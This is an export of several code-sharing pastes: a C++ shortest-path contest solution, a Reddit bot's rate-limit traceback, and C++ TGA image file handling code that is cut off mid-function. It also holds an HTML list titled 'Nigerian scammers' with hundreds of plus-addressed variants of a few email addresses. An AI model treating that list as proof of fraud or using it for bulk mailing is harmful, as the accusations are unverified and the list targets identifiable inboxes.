id,title,username,language,date,content
4D8Gmc8c,L - Walking to School,danielvitor23,C++,Thursday 13th of July 2023 12:56:06 PM CDT,"#include <bits/stdc++.h>
using namespace std;

using ii = pair<int, int>;
using i64 = long long;

const int INF = 0x3f3f3f3f;

int n, m, T;
vector<vector<ii>> gr;

i64 dijkstra(int source) {
  vector<i64> dist(n+1, INF);

  dist[source] = 0;

  priority_queue<tuple<i64, i64, int>> pq;
  pq.push({ 0, 0, source });

  while (!pq.empty()) {
    auto [d, r, u] = pq.top(); pq.pop();

    if (d > dist[u]) continue;

    for (auto [w, to] : gr[u]) {
      if (dist[u] + r * w < dist[to]) {
        dist[to] = dist[u] + r * w;

        pq.push({ dist[to], r + (w == 0 ? 0 : 1), to });
      }
    }
  }

  return dist[T] == INF ? -1 : dist[T];
}

int main() {
  cin.tie(0)->sync_with_stdio(0);

  cin >> n >> m >> T, --T;

  gr.assign(n, vector<ii>());

  for (int i = 0; i < m; ++i) {
    int a, b, c; cin >> a >> b >> c, --a, --b;

    gr[a].push_back({ c, b });
    gr[b].push_back({ c, a });
  }

  cout << dijkstra(0) << '\n';
}"
etgi8PKs,Nigerian scammers [13-7-1/2023],bombaires,HTML,Thursday 13th of July 2023 12:50:25 PM CDT,"<a href=""mailto:abrituoficina@remax.com.ar"">abrituoficina@remax.com.ar</a>
<a href=""mailto:support@mekongsourcings.com"">support@mekongsourcings.com</a>
<a href=""mailto:moneygramoffice55@aol.com"">moneygramoffice55@aol.com</a>
<a href=""mailto:deptmanagementofficenigeria@gmail.com"">deptmanagementofficenigeria@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+18482@gmail.com"">deptmanagementofficenigeria+18482@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+30671@gmail.com"">deptmanagementofficenigeria+30671@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+446@gmail.com"">deptmanagementofficenigeria+446@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+18060@gmail.com"">deptmanagementofficenigeria+18060@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20315@gmail.com"">deptmanagementofficenigeria+20315@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+22460@gmail.com"">deptmanagementofficenigeria+22460@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20796@gmail.com"">deptmanagementofficenigeria+20796@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20684@gmail.com"">deptmanagementofficenigeria+20684@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+472@gmail.com"">deptmanagementofficenigeria+472@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+24392@gmail.com"">deptmanagementofficenigeria+24392@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14751@gmail.com"">deptmanagementofficenigeria+14751@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+31353@gmail.com"">deptmanagementofficenigeria+31353@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+6758@gmail.com"">deptmanagementofficenigeria+6758@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23670@gmail.com"">deptmanagementofficenigeria+23670@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+3890@gmail.com"">deptmanagementofficenigeria+3890@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+13970@gmail.com"">deptmanagementofficenigeria+13970@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+32602@gmail.com"">deptmanagementofficenigeria+32602@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+13319@gmail.com"">deptmanagementofficenigeria+13319@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+6308@gmail.com"">deptmanagementofficenigeria+6308@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+11789@gmail.com"">deptmanagementofficenigeria+11789@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+6652@gmail.com"">deptmanagementofficenigeria+6652@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+21349@gmail.com"">deptmanagementofficenigeria+21349@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+18589@gmail.com"">deptmanagementofficenigeria+18589@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+16738@gmail.com"">deptmanagementofficenigeria+16738@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+19736@gmail.com"">deptmanagementofficenigeria+19736@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+22120@gmail.com"">deptmanagementofficenigeria+22120@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+16250@gmail.com"">deptmanagementofficenigeria+16250@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+30950@gmail.com"">deptmanagementofficenigeria+30950@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23422@gmail.com"">deptmanagementofficenigeria+23422@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14127@gmail.com"">deptmanagementofficenigeria+14127@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+11762@gmail.com"">deptmanagementofficenigeria+11762@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+787@gmail.com"">deptmanagementofficenigeria+787@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+26680@gmail.com"">deptmanagementofficenigeria+26680@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+18344@gmail.com"">deptmanagementofficenigeria+18344@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+31235@gmail.com"">deptmanagementofficenigeria+31235@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4894@gmail.com"">deptmanagementofficenigeria+4894@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+29559@gmail.com"">deptmanagementofficenigeria+29559@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+2799@gmail.com"">deptmanagementofficenigeria+2799@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+28856@gmail.com"">deptmanagementofficenigeria+28856@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14073@gmail.com"">deptmanagementofficenigeria+14073@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+12283@gmail.com"">deptmanagementofficenigeria+12283@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+10433@gmail.com"">deptmanagementofficenigeria+10433@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14233@gmail.com"">deptmanagementofficenigeria+14233@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+8323@gmail.com"">deptmanagementofficenigeria+8323@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+12603@gmail.com"">deptmanagementofficenigeria+12603@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+28063@gmail.com"">deptmanagementofficenigeria+28063@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4435@gmail.com"">deptmanagementofficenigeria+4435@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+12930@gmail.com"">deptmanagementofficenigeria+12930@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+15506@gmail.com"">deptmanagementofficenigeria+15506@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+31531@gmail.com"">deptmanagementofficenigeria+31531@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4405@gmail.com"">deptmanagementofficenigeria+4405@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+18800@gmail.com"">deptmanagementofficenigeria+18800@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14339@gmail.com"">deptmanagementofficenigeria+14339@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+21931@gmail.com"">deptmanagementofficenigeria+21931@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+30696@gmail.com"">deptmanagementofficenigeria+30696@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+30402@gmail.com"">deptmanagementofficenigeria+30402@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+2376@gmail.com"">deptmanagementofficenigeria+2376@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+8097@gmail.com"">deptmanagementofficenigeria+8097@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+29774@gmail.com"">deptmanagementofficenigeria+29774@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+12674@gmail.com"">deptmanagementofficenigeria+12674@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+19428@gmail.com"">deptmanagementofficenigeria+19428@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14183@gmail.com"">deptmanagementofficenigeria+14183@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+3999@gmail.com"">deptmanagementofficenigeria+3999@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14685@gmail.com"">deptmanagementofficenigeria+14685@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+13694@gmail.com"">deptmanagementofficenigeria+13694@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4883@gmail.com"">deptmanagementofficenigeria+4883@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+987@gmail.com"">deptmanagementofficenigeria+987@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20732@gmail.com"">deptmanagementofficenigeria+20732@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+8453@gmail.com"">deptmanagementofficenigeria+8453@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+16061@gmail.com"">deptmanagementofficenigeria+16061@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23929@gmail.com"">deptmanagementofficenigeria+23929@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20001@gmail.com"">deptmanagementofficenigeria+20001@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20032@gmail.com"">deptmanagementofficenigeria+20032@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+20141@gmail.com"">deptmanagementofficenigeria+20141@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23864@gmail.com"">deptmanagementofficenigeria+23864@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+3704@gmail.com"">deptmanagementofficenigeria+3704@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23719@gmail.com"">deptmanagementofficenigeria+23719@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+9164@gmail.com"">deptmanagementofficenigeria+9164@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+3139@gmail.com"">deptmanagementofficenigeria+3139@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+5911@gmail.com"">deptmanagementofficenigeria+5911@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+7674@gmail.com"">deptmanagementofficenigeria+7674@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+6270@gmail.com"">deptmanagementofficenigeria+6270@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+17543@gmail.com"">deptmanagementofficenigeria+17543@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+32131@gmail.com"">deptmanagementofficenigeria+32131@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+2753@gmail.com"">deptmanagementofficenigeria+2753@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+14214@gmail.com"">deptmanagementofficenigeria+14214@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+10791@gmail.com"">deptmanagementofficenigeria+10791@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+21571@gmail.com"">deptmanagementofficenigeria+21571@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23032@gmail.com"">deptmanagementofficenigeria+23032@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+23198@gmail.com"">deptmanagementofficenigeria+23198@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+27562@gmail.com"">deptmanagementofficenigeria+27562@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+11923@gmail.com"">deptmanagementofficenigeria+11923@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+689@gmail.com"">deptmanagementofficenigeria+689@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+28361@gmail.com"">deptmanagementofficenigeria+28361@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+3415@gmail.com"">deptmanagementofficenigeria+3415@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4489@gmail.com"">deptmanagementofficenigeria+4489@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+7815@gmail.com"">deptmanagementofficenigeria+7815@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4749@gmail.com"">deptmanagementofficenigeria+4749@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+7586@gmail.com"">deptmanagementofficenigeria+7586@gmail.com</a>
<a href=""mailto:deptmanagementofficenigeria+4263@gmail.com"">deptmanagementofficenigeria+4263@gmail.com</a>
<a href=""mailto:unitedbankofafrica674@gmail.com"">unitedbankofafrica674@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+13538@gmail.com"">unitedbankofafrica674+13538@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+117@gmail.com"">unitedbankofafrica674+117@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+13947@gmail.com"">unitedbankofafrica674+13947@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+19969@gmail.com"">unitedbankofafrica674+19969@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+26775@gmail.com"">unitedbankofafrica674+26775@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+23062@gmail.com"">unitedbankofafrica674+23062@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+4658@gmail.com"">unitedbankofafrica674+4658@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+26920@gmail.com"">unitedbankofafrica674+26920@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+29076@gmail.com"">unitedbankofafrica674+29076@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+6391@gmail.com"">unitedbankofafrica674+6391@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+12582@gmail.com"">unitedbankofafrica674+12582@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+19097@gmail.com"">unitedbankofafrica674+19097@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+26277@gmail.com"">unitedbankofafrica674+26277@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+12581@gmail.com"">unitedbankofafrica674+12581@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+31132@gmail.com"">unitedbankofafrica674+31132@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+30119@gmail.com"">unitedbankofafrica674+30119@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+14565@gmail.com"">unitedbankofafrica674+14565@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+27345@gmail.com"">unitedbankofafrica674+27345@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+28288@gmail.com"">unitedbankofafrica674+28288@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+31206@gmail.com"">unitedbankofafrica674+31206@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+24187@gmail.com"">unitedbankofafrica674+24187@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+5314@gmail.com"">unitedbankofafrica674+5314@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+24114@gmail.com"">unitedbankofafrica674+24114@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+9002@gmail.com"">unitedbankofafrica674+9002@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+819@gmail.com"">unitedbankofafrica674+819@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+26681@gmail.com"">unitedbankofafrica674+26681@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+30417@gmail.com"">unitedbankofafrica674+30417@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+22794@gmail.com"">unitedbankofafrica674+22794@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+21454@gmail.com"">unitedbankofafrica674+21454@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+13277@gmail.com"">unitedbankofafrica674+13277@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+16690@gmail.com"">unitedbankofafrica674+16690@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+29127@gmail.com"">unitedbankofafrica674+29127@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+13193@gmail.com"">unitedbankofafrica674+13193@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+29701@gmail.com"">unitedbankofafrica674+29701@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+20571@gmail.com"">unitedbankofafrica674+20571@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+25545@gmail.com"">unitedbankofafrica674+25545@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+26966@gmail.com"">unitedbankofafrica674+26966@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+30320@gmail.com"">unitedbankofafrica674+30320@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+6732@gmail.com"">unitedbankofafrica674+6732@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+16961@gmail.com"">unitedbankofafrica674+16961@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+6223@gmail.com"">unitedbankofafrica674+6223@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+1487@gmail.com"">unitedbankofafrica674+1487@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+5561@gmail.com"">unitedbankofafrica674+5561@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+11881@gmail.com"">unitedbankofafrica674+11881@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+18029@gmail.com"">unitedbankofafrica674+18029@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+6266@gmail.com"">unitedbankofafrica674+6266@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+29259@gmail.com"">unitedbankofafrica674+29259@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+15081@gmail.com"">unitedbankofafrica674+15081@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+16707@gmail.com"">unitedbankofafrica674+16707@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+10397@gmail.com"">unitedbankofafrica674+10397@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+6410@gmail.com"">unitedbankofafrica674+6410@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+21186@gmail.com"">unitedbankofafrica674+21186@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+20022@gmail.com"">unitedbankofafrica674+20022@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+32746@gmail.com"">unitedbankofafrica674+32746@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+15858@gmail.com"">unitedbankofafrica674+15858@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+18091@gmail.com"">unitedbankofafrica674+18091@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+21086@gmail.com"">unitedbankofafrica674+21086@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+6647@gmail.com"">unitedbankofafrica674+6647@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+739@gmail.com"">unitedbankofafrica674+739@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+30270@gmail.com"">unitedbankofafrica674+30270@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+31839@gmail.com"">unitedbankofafrica674+31839@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+17633@gmail.com"">unitedbankofafrica674+17633@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+14012@gmail.com"">unitedbankofafrica674+14012@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+32062@gmail.com"">unitedbankofafrica674+32062@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+9428@gmail.com"">unitedbankofafrica674+9428@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+2144@gmail.com"">unitedbankofafrica674+2144@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+8301@gmail.com"">unitedbankofafrica674+8301@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+11630@gmail.com"">unitedbankofafrica674+11630@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+32263@gmail.com"">unitedbankofafrica674+32263@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+23910@gmail.com"">unitedbankofafrica674+23910@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+4436@gmail.com"">unitedbankofafrica674+4436@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+18646@gmail.com"">unitedbankofafrica674+18646@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+4108@gmail.com"">unitedbankofafrica674+4108@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+14380@gmail.com"">unitedbankofafrica674+14380@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+28291@gmail.com"">unitedbankofafrica674+28291@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+12386@gmail.com"">unitedbankofafrica674+12386@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+15209@gmail.com"">unitedbankofafrica674+15209@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+29758@gmail.com"">unitedbankofafrica674+29758@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+26886@gmail.com"">unitedbankofafrica674+26886@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+20642@gmail.com"">unitedbankofafrica674+20642@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+25768@gmail.com"">unitedbankofafrica674+25768@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+30931@gmail.com"">unitedbankofafrica674+30931@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+17789@gmail.com"">unitedbankofafrica674+17789@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+1253@gmail.com"">unitedbankofafrica674+1253@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+17743@gmail.com"">unitedbankofafrica674+17743@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+18049@gmail.com"">unitedbankofafrica674+18049@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+27475@gmail.com"">unitedbankofafrica674+27475@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+1387@gmail.com"">unitedbankofafrica674+1387@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+7951@gmail.com"">unitedbankofafrica674+7951@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+2141@gmail.com"">unitedbankofafrica674+2141@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+23337@gmail.com"">unitedbankofafrica674+23337@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+16948@gmail.com"">unitedbankofafrica674+16948@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+959@gmail.com"">unitedbankofafrica674+959@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+24993@gmail.com"">unitedbankofafrica674+24993@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+30916@gmail.com"">unitedbankofafrica674+30916@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+20941@gmail.com"">unitedbankofafrica674+20941@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+13671@gmail.com"">unitedbankofafrica674+13671@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+27946@gmail.com"">unitedbankofafrica674+27946@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+1235@gmail.com"">unitedbankofafrica674+1235@gmail.com</a>
<a href=""mailto:unitedbankofafrica674+1957@gmail.com"">unitedbankofafrica674+1957@gmail.com</a>"
rQ3iM2Fe,TooManyRequests: received 429 HTTP response,Vault-TecTradingCo,Python,Thursday 13th of July 2023 12:50:00 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/main.py"", line 258, in main
    for comment in comment_stream:
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/util.py"", line 195, in stream_generator
    for item in reversed(list(function(limit=limit, **function_kwargs))):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 63, in __next__
    self._next_batch()
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 634, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 739, in _objectify_request
    self.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 266, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.TooManyRequests: received 429 HTTP response
"
ZM9Lb1vS,read/write test,Jakzon123,C++,Thursday 13th of July 2023 12:47:57 PM CDT,"#include <iostream>
#include ""File.h""

int main() {
    std::string inputFilePath = ""input/car.tga"";
    std::string outputFilePath = ""output/cartest.tga"";

    // Create an instance of the File class
    File file(inputFilePath);

    // Print the header information
    File::Header header = file.getHeader();
    std::cout << ""Header Information:"" << std::endl;
    std::cout << ""Width: "" << header.width << std::endl;
    std::cout << ""Height: "" << header.height << std::endl;

    // Write the modified file to a new file
    file.WriteFile(outputFilePath);

    return 0;
}"
j6Z4AEea,File.h,Jakzon123,C++,Thursday 13th of July 2023 12:47:28 PM CDT,"#pragma once
#include <string>
#include <fstream>

class File {
	public:

		// storing file header data
		struct Header {
			char idLength;
			char colorMapType;
			char dataTypeCode;
			short colorMapOrigin;
			short colorMapLength;
			char colorMapDepth;
			short xOrigin;
			short yOrigin;
			short width;
			short height;
			char bitsPerPixel;
			char imageDescriptor;
		};

		// storing pixel data
		struct Pixel {
			unsigned char blue;
			unsigned char green;
			unsigned char red;
		};

		// constructor and destructor
		File(std::string fileName);
		~File();

		// define essential functions
    bool ReadFile(std::string fileName);
    bool WriteFile(std::string fileName);

		Header readHeader(std::ifstream& file);
		void writeHeader(Header header, std::ofstream& file);

		Pixel** readPixelArray(std::ifstream& file, int width, int height);
		void writePixelArray(Pixel** pixelArray, std::ofstream& file);

    Header getHeader();

	private:
		Header header;
		Pixel** pixelArray;
};
"
SW7MTRyK,File.cpp,Jakzon123,C++,Thursday 13th of July 2023 12:46:41 PM CDT,"#include ""File.h""
#include <string>
#include <fstream>
#include <iostream>

// constructor
File::File(std::string fileName) {
    header = {};
    pixelArray = nullptr;
  
    if (!ReadFile(fileName)) {
        // file not read properly, explain error
        std::cout << ""File read incorrectly."" << std::endl;
    }
}

// destructor
File::~File() {
    // Free dynamically allocated memory for pixelArray
    if (pixelArray != nullptr) {
        for (int i = 0; i < header.height; ++i) {
            delete[] pixelArray[i];
        }
        delete[] pixelArray;
    }
}

// read file
bool File::ReadFile(std::string fileName) {
    // open file
    std::ifstream file(fileName, std::ios::binary);

    if (!file.is_open()) {
        std::cout << ""Failed to open target file."" << std::endl;
        return false;
    }

	  // read header from file
    header = readHeader(file);

    // read pixels into pixel array
    pixelArray = readPixelArray(file, header.width, header.height);

    // close file
    file.close();

    return true;
}

// write file
bool File::WriteFile(std::string fileName) {
    // open file
    std::ofstream file(fileName, std::ios::binary);
  
    if (!file.is_open()) {
        std::cout << ""Failed to open target file."" << std::endl;
        return false;
    }  

    // write header to file
    writeHeader(header, file);
  
  	// write pixel array to file
  	writePixelArray(pixelArray, file); 

    if (pixelArray == nullptr) {
        return false;
    }
  
    // close file
    file.close();

    return true;
}

// read header
File::Header File::readHeader(std::ifstream& file) {
    Header header;

    // Read each component of the header
    file.read(reinterpret_cast<char*>(&header.idLength), sizeof(char));
    file.read(reinterpret_cast<char*>(&header.colorMapType), sizeof(char));
    file.read(reinterpret_cast<char*>(&header.dataTypeCode), sizeof(char));
    file.read(reinterpret_cast<char*>(&header.colorMapOrigin), sizeof(short));
    file.read(reinterpret_cast<char*>(&header.colorMapLength), sizeof(short));
    file.read(reinterpret_cast<char*>(&header.colorMapDepth), sizeof(char));
    file.read(reinterpret_cast<char*>(&header.xOrigin), sizeof(short));
    file.read(reinterpret_cast<char*>(&header.yOrigin), sizeof(short));
    file.read(reinterpret_cast<char*>(&header.width), sizeof(short));
    file.read(reinterpret_cast<char*>(&header.height), sizeof(short));
    file.read(reinterpret_cast<char*>(&header.bitsPerPixel), sizeof(char));
    file.read(reinterpret_cast<char*>(&header.imageDescriptor), sizeof(char));

    return header;
}

// write header to file
void File::writeHeader(Header header, std::ofstream& file) {
    // write each component of the header
    file.write(reinterpret_cast<char*>(&header.idLength), sizeof(char));
    file.write(reinterpret_cast<char*>(&header.colorMapType), sizeof(char));
    file.write(reinterpret_cast<char*>(&header.dataTypeCode), sizeof(char));
    file.write(reinterpret_cast<char*>(&header.colorMapOrigin), sizeof(short));
    file.write(reinterpret_cast<char*>(&header.colorMapLength), sizeof(short));
